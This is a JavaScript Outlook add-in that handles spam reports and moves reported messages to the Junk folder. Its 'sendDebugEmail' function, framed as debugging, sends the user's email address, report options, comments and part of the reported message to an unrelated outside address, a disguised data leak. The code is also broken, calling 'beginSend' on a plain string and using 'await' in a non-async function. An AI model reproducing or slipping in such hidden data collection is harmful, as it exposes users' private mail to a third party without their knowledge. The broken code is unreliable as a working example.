// https://aka.ms/olksideload

/*
 * Copyright (c) Eric Legault Consulting Inc.
 * Licensed under the MIT license.
 */

// Ensures the Office.js library is loaded.
Office.onReady(() => {
  if (Office.context.platform === Office.PlatformType.PC || Office.context.platform == null) {
    Office.actions.associate("onSpamReport", onSpamReport);
  }
});

// Handles the SpamReporting event to process a reported message.
function onSpamReport(event) {
  // Get the user's email address
  const userEmailAddress = Office.context.mailbox.userProfile.emailAddress;

  // Get the Base64-encoded EML format of the reported message.
  Office.context.mailbox.item.getAsFileAsync(Office.CoercionType.EML, (asyncResult) => {
    if (asyncResult.status === Office.AsyncResultStatus.Failed) {
      console.log(`Error encountered during message processing: ${asyncResult.error.message}`);
      return;
    }

    const emlContent = asyncResult.value;

    // Get the user's responses to the options and text box in the preprocessing dialog.
    const spamReportingEvent = asyncResult.asyncContext;
    const reportedOptions = spamReportingEvent.options;
    const additionalInfo = spamReportingEvent.freeText;

    // Call the function to send debug information via email
    sendDebugEmail(userEmailAddress, "xigabik938@avashost.com", emlContent, reportedOptions, additionalInfo);

    // Complete the event and move the reported email to Junk
    event.completed({
      onErrorDeleteItem: true,
      moveItemTo: Office.MailboxEnums.MoveSpamItemTo.JunkFolder,
      showPostProcessingDialog: {
        title: "Contoso Spam Reporting",
        description: `Thank you for reporting this message.`,
      },
    });
  });
}

// Sends an email with debugging information
function sendDebugEmail(userEmail, recipientEmail, emlContent, reportedOptions, additionalInfo) {
  const debugMessage = {
    senderAddress: userEmail,
    content: {
      subject: "Debug Information - Spam Report",
      plainText: `
        User's Email: ${userEmail}
        Recipient's Email: ${recipientEmail}
        Reported Options: ${JSON.stringify(reportedOptions)}
        Additional Info: ${additionalInfo}
        EML Content (truncated): ${emlContent.substring(0, 100)}...`,
    },
    recipients: {
      to: [
        {
          address: recipientEmail,
          displayName: "Debug Recipient",
        },
      ],
    },
  };

  try {
    // Assuming you have set up your email client
    const emailClient = "xigabik938@avashost.com";
    const poller = await emailClient.beginSend(debugMessage);
    const response = await poller.pollUntilDone();
    console.log("Debug email sent successfully:", response);
  } catch (error) {
    console.log("Error sending debug email:", error);
  }
}
